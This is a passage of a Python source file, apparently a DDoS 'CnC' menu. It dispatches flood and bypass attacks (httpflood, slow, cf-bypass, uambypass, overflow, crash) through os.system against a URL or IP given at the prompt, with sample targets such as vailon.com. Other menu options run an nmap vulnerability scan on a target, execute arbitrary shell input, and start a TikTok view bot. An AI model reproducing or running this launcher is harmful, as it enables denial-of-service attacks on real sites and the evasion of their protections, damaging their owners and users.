                            try:
                                url = cnc.split()[1]
                                time = cnc.split()[2]
                                thread = cnc.split()[3]
                                os.system(f'python3 https-spoof.py {url} {time} {thread}')
                            except IndexError:
                                print('Usage: https-spoof <url> <time> <threads>')
                                print('Example: https-spoof http://vailon.com 60 500')

                        elif "slow" in cnc:
                            try:
                                url = cnc.split()[1]
                                time = cnc.split()[2]
                                os.system(f'node slow.js {url} {time}')
                            except IndexError:
                                print('Usage: slow <url> <time>')
                                print('Example: slow http://vailon.com 60')

                        elif "hyper" in cnc:
                            try:
                                url = cnc.split()[1]
                                time = cnc.split()[2]
                                os.system(f'node hyper.js {url} {time}')
                            except IndexError:
                                print('Usage: hyper <url> <time>')
                                print('Example: hyper http://vailon.com 60')

                        elif "cf-socket" in cnc:
                            try:
                                os.system(f'python3 bypass.py')
                            except IndexError:
                                print('cf-socket')

                        elif "cf-pro" in cnc:
                            try:
                                os.system(f'python3 cf-pro.py')
                            except IndexError:
                                print('cf-pro')
                        elif "cf-socket" in cnc:
                            try:
                                os.system(f'python3 bypass.py')
                            except IndexError:
                                print('cf-socket')

                        elif "http-socket" in cnc:
                            try:
                                url = cnc.split()[1]
                                per = cnc.split()[2]
                                time = cnc.split()[3]
                                os.system(f'node HTTP-SOCKET {url} {per} {time}')
                            except IndexError:
                                print('Usage: http-socket <url> <per> <time>')
                                print('Example: http-socket http://example.com 5000 60')

                        elif "http-raw" in cnc:
                            try:
                                url = cnc.split()[1]
                                time = cnc.split()[2]
                                os.system(f'node HTTP-RAW {url} {time}')
                            except IndexError:
                                print('Usage: http-raw <url> <time>')
                                print('Example: http-raw http://example.com 60')

                        elif "http-requests" in cnc:
                            try:
                                url = cnc.split()[1]
                                time = cnc.split()[2]
                                os.system(f'node HTTP-REQUESTS {url} {time}')
                            except IndexError:
                                print('Usage: http-requests <url> <time>')
                                print('Example: http-requests http://example.org 60')

                        elif "http-rand" in cnc:
                            try:
                                url = cnc.split()[1]
                                time = cnc.split()[2]
                                os.system(f'node HTTP-RAND.js {url} {time}')
                            except IndexError:
                                print('Usage: http-rand <url> <time>')
                                print('Example: http-rand http://vailon.com/ 60')

                        elif "overflow" in cnc:
                            try:
                                ip = cnc.split()[1]
                                port = cnc.split()[2]
                                thread = cnc.split()[3]
                                os.system(f'./OVERFLOW {ip} {port} {thread}')
                            except IndexError:
                                print('Usage: overflow <ip> <port> <threads>')
                                print('Example: overflow 1.1.1.1 80 5000')

                        elif "cf-bypass" in cnc:
                            try:
                                url = cnc.split()[1]
                                time = cnc.split()[2]
                                thread = cnc.split()[3]
                                os.system(f'node cf.js {url} {time} {thread}')
                            except IndexError:
                                print('Usage: cf-bypass <url> <time> <threads>')
                                print('Example: cf-bypass http://example.com 60 1250')

                        elif "uambypass" in cnc:
                            try:
                                url = cnc.split()[1]
                                time = cnc.split()[2]
                                per = cnc.split()[3]
                                os.system(f'node uambypass.js {url} {time} {per} http.txt')
                            except IndexError:
                                print('Usage: uambypass <url> <time> <req_per_ip>')
                                print('Example: uambypass http://example.com 60 1250')

                        elif "crash" in cnc:
                            try:
                                url = cnc.split()[1]
                                method = cnc.split()[2]
                                os.system(f'go run sever.go -site {url} -data {method}')
                            except IndexError:
                                print('Usage: crash <url> METHODS<GET/POST>')
                                print('Example: crash http://example.com GET')

                        elif "httpflood" in cnc:
                            try:
                                url = cnc.split()[1]
                                thread = cnc.split()[2]
                                method = cnc.split()[3]
                                time = cnc.split()[4]
                                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
                            except IndexError:
                                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                                print('Example: httpflood http://example.com 15000 get 60')

                        elif "httpget" in cnc:
                            try:
                                url = cnc.split()[1]
                                os.system(f'./httpget {url} 10000 50 100')
                            except IndexError:
                                print('Usage: httpget <url>')
                                print('Example: httpget http://example.com')

                        elif "info" in cnc:
                            print("")
                        else:
                            try:
                                cmmnd = cnc.split()[0]
                                print("Command: [ " + cmmnd + " ] Error command")
                            except IndexError:
                                pass
                main()

            if option == "2":
                tg = input("Target > ")
                os.system("nmap -sV --script=vulscan/vulscan.nse " + tg)
            if option == "3":
                commd = input("Command > ")
                os.system(commd)
            if option == "4":
                os.system("cd TikTok-ViewBot && py main.py")
            if option == "5":
                print("This option is not support for Windows")
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        if os.name == "Linux":
            os.system("clear")
            print("System is Exitting...")
            time.sleep(2)
            print("Exitted!")
        else:
            os.system("cls")
            print("System is Exitting...")
            time.sleep(2)
            print("Exitted!")
